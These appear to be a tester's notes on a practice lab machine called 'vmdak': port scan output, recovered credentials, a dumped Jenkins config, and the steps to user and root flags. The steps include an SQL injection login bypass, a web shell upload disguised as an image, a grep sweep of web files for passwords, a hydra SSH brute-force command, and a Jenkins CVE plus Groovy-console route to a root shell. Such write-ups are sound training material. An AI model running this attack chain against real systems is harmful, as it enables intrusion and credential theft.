## Open Ports

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

```powershell
21/tcp   open  ftp      vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.196
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            1752 Sep 19  2024 config.xml

22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:18:f1:19:6b:29:db:da:3d:f6:7b:ab:f4:b5:63:e0 (ECDSA)
|_  256 cb:d8:d6:ef:82:77:8a:25:32:08:dd:91:96:8d:ab:7d (ED25519)

80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)

9443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title:  Home - Prison Management System
| ssl-cert: Subject: commonName=vmdak.local/organizationName=PrisonManagement/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:vmdak.local
| Not valid before: 2024-08-20T09:21:33
|_Not valid after:  2025-08-20T09:21:33
| tls-alpn: 
|_  http/1.1

```


---
## Software Versions

```powershell
Hudson 2.401.2
```

## Discovered Credentials
root
```
sqlCr3ds3xp0seD
```
employee_akpoly

mysql -u root -psqlCr3ds3xp0seD -h 192.168.209.103

Malcom : escobar2012

vmdak : RonnyCache001

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---
## Attack Angles

```powershell 
┌──(kali㉿kali)-[~/Desktop/PGPlay/vmdak]
└─$ cat config.xml                                 
<?xml version='1.1' encoding='UTF-8'?>
<hudson>
  <disabledAdministrativeMonitors/>
  <version>2.401.2</version>
  <numExecutors>2</numExecutors>
  <mode>NORMAL</mode>
  <useSecurity>true</useSecurity>
  <authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">
    <denyAnonymousReadAccess>false</denyAnonymousReadAccess>
  </authorizationStrategy>
  <securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
    <disableSignup>true</disableSignup>
    <enableCaptcha>false</enableCaptcha>
  </securityRealm>
  <disableRememberMe>false</disableRememberMe>
  <projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>
  <workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>
  <buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>
  <jdks/>
  <viewsTabBar class="hudson.views.DefaultViewsTabBar"/>
  <myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>
  <clouds/>
  <InitialRootPassword>/root/.jenkins/secrets/initialAdminPassword></InitialRootPassword>
  <scmCheckoutRetryCount>0</scmCheckoutRetryCount>
  <views>
    <hudson.model.AllView>
      <owner class="hudson" reference="../../.."/>
      <name>all</name>
      <filterExecutors>false</filterExecutors>
      <filterQueue>false</filterQueue>
      <properties class="hudson.model.View$PropertyList"/>
    </hudson.model.AllView>
  </views>
  <primaryView>all</primaryView>
  <slaveAgentPort>-1</slaveAgentPort>
  <label></label>
  <crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">
    <excludeClientIPFromCrumb>false</excludeClientIPFromCrumb>
  </crumbIssuer>
  <nodeProperties/>
  <globalNodeProperties/>
  <nodeRenameMigrationNeeded>false</nodeRenameMigrationNeeded>
</hudson>
```


---
## Steps to User.txt

SQLI injection on admin login page

```powershell
Username: admin' or '1'='1  
Password: poop (can be any garbage value)
```

Fast5 Prison Management System

https://www.exploit-db.com/exploits/52017

Further research about this Prison Management System also shows us that we can upload a shell to gain RCE by heading to Home > Edit Photo

Intercept req using burpsuite, upload shell.php disguised as png file first, then edit in burpsuite back to php.

Right click on user photo and open link to see photo and trigger reverse shell. 

Reverse shell as www-data received

```
grep -rEi --include=\*.{php,env,conf,ini} -E "['\"]?(password|pass|db_pass|db_passwd)['\"]?\s*[:=]\s*['\"][^'\" ]+['\"]" /var/www/ --exclude-dir={node_modules,vendor,cache,logs,.git}
```

Reveals

root:sqlCr3ds3xp0seD

Connect using mysql and find From these two tables, we can obtain the passwords “escobar2012” and “RonnyCache001”.

hydra -L user.txt -P pass.txt 192.168.142.103 ssh -t 4

vmdak : RonnyCache001

vmdak can read local.txt



---
## Steps to root.txt

internal port 8080 discovered. [[Chisel Reverse Port Forward]] and access locally. 

jenkins page asking for password. 

https://github.com/godylockz/CVE-2024-23897

Use this CVE to read the password

https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6

Follow guide and enter console. [[Jenkins Priv Esc]]

Cmd in console and get reverse shell as root

---